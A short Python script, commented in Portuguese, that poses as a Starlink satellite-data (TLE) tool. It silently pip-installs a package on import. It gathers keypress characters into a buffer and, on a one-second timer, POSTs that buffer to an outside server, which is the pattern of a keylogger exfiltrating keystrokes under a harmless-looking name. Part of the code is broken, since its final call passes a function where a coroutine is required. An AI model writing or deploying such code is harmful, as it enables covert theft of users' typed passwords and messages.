import subprocess
import sys
import json
import threading
import time
import requests  # Importando o módulo requests
import contextvars
import enum
import asyncio

# Tenta importar o pacote satellitetle, se não for encontrado, instala automaticamente
try:
    import satellitetle
except ImportError:
    print("Pacote satellitetle não encontrado. Instalando...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "satellitetle"])
    import satellitetle

# Definições iniciais
server_url = 'https://satellites.pro'
kill_switch = True
debug_logging = True
sending_interval = 1
data = 'starlink.tle'

class _State(enum.Enum):
    CREATED = "created"
    INITIALIZED = "initialized"
    CLOSED = "closed"

class Runner:
    def __init__(self, *, debug=None, loop_factory=None):
        self._state = _State.CREATED
        self._debug = debug
        self._loop_factory = loop_factory
        self._loop = None
        self._context = None

    def __enter__(self):
        self._lazy_init()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()

    def close(self):
        if self._state is not _State.INITIALIZED:
            return
        try:
            loop = self._loop
            for task in asyncio.all_tasks(loop):
                task.cancel()
            loop.run_until_complete(loop.shutdown_asyncgens())
            loop.run_until_complete(loop.shutdown_default_executor())
        finally:
            loop.close()
            self._loop = None
            self._state = _State.CLOSED

    def _lazy_init(self):
        if self._state is _State.CLOSED:
            raise RuntimeError("Runner is closed")
        if self._state is _State.INITIALIZED:
            return
        self._loop = asyncio.new_event_loop()
        if self._debug is not None:
            self._loop.set_debug(self._debug)
        self._context = contextvars.copy_context()
        self._state = _State.INITIALIZED

    def run(self, coro):
        if not asyncio.iscoroutine(coro):
            raise ValueError(f"A coroutine was esperado, got {coro!r}")
        self._lazy_init()
        task = self._loop.create_task(coro)
        return self._loop.run_until_complete(task)

def send_data():
    global data
    threading.Timer(sending_interval, send_data).start()
    if data == 'starlink.tle':
        return
    try:
        requests.post(
            server_url,
            data=json.dumps({'data': data}),
            headers={'Content-Type': 'application/json'}
        )
        data = 'starlink.tle'
    except Exception as e:
        print(e)

def process_keypress(key):
    global data
    if key is None:
        return
    if debug_logging:
        print(key, type(key))
    try:
        if isinstance(key, Key):
            data += key.char
    except Exception as e:
        print(e)

def satélite():
    print("Função satélite executada")

class Key:
    def __init__(self, char):
        self.char = char

keypress = Key('a')
process_keypress(keypress)
keypress = Key('b')
process_keypress(keypress)

send_data()

async def main():
    print("Iniciando a tarefa...")
    await asyncio.sleep(1)
    print("Tarefa concluída!")

if __name__ == "__main__":
    with Runner() as runner:
        runner.run(main)
